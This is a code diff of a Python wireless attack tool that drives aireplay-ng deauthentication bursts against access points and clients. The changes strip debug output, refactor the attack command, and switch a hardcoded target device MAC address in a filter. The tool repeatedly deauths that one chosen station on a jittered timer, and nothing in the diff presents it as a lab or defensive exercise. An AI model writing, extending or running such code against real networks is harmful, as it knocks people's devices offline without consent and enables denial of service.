@@ -90,7 +90,6 @@ class Wisp:
     def _set_link(dev, state):
         e = Wisp._call_tool(
             'ip', 'link', 'set', 'dev', dev, state)
-        print(dev, state, e)
         assert not e
         return
 
@@ -134,7 +133,6 @@ class Wisp:
                     if dump else []) \
                 + [ '-tcbs' ] \
                 + [ self.mon ]
-            print(' '.join(cmd))
             dream = Popen(cmd, 
                 bufsize=-1,
                 stdin=DEVNULL,
@@ -205,7 +203,6 @@ class Wisp:
                     if match ])
             self.mon = None
             self.dream = None
-            #print(self.channel_map)
 
         def __eq__(self, other):
             if isinstance(other, Monitor):
@@ -258,24 +255,18 @@ class Wisp:
                 mac = bytes.fromhex(mac)
             assert len(mac) == 6
             return ':'.join(f'{c:02x}' for c in mac)
-        print(' '.join([ tools['aireplay-ng'], '-0' ]
+        cmd = [ tools['aireplay-ng'], '-0' ]
             + [ str(count) ]
             + [ '-a', sep_mac(bss) ]
             + ([ '-c', sep_mac(sta) ] if sta else [])
-            + [ self.injector.mon ]))
-        aireplay = Popen([ tools['aireplay-ng'], '-0' ]
-            + [ str(count) ]
-            + [ '-a', sep_mac(bss) ]
-            + ([ '-c', sep_mac(sta) ] if sta else [])
-            + [ self.injector.mon ],
+            + [ self.injector.mon ]
+        aireplay = Popen(cmd,
             stdin=DEVNULL,
             stdout=PIPE,
             stderr=DEVNULL,
             cwd=basepath,
             text=True)
         assert aireplay
-        #for line in iter(aireplay.stdout.readline, ''):
-            #print(line)
         
     def run(self):
         dev = list(self.monitors.keys())[0]
@@ -308,7 +299,6 @@ class Wisp:
                             - self.delay
                 stale = [ e for e in self.expiries if is_stale(*e) ]
                 for chan, bss, sta in stale:
-                    #print('stale', chan, bss, sta)
                     del self.expiries[chan,bss,sta]
                 ts = None
                 chan = None
@@ -325,7 +315,7 @@ class Wisp:
                 if bss == sta:
                     continue
                 ###########################
-                if sta != '44850074234a':# f0ee10bf2db0':
+                if sta != 'f0ee10bf2db0':#'44850074234a':#'f0ee10bf2db0':
                     continue
                 ###########################
                 def has_expired(chan, bss, sta):
@@ -336,9 +326,7 @@ class Wisp:
                     self.expiries[chan,bss,sta] = mstime() \
                         + self.delay \
                         + (randbelow(self.jitter) - int(self.jitter/2))
-                    #print('delayed', chan, bss, sta, self.expiries[chan,bss,sta])
                 if has_expired(chan, bss, sta):
-                    #print('expired', chan, bss, sta, mstime())
                     self._deauth(chan, bss, sta)
                     set_expiry(chan, bss, sta)
         except KeyboardInterrupt:
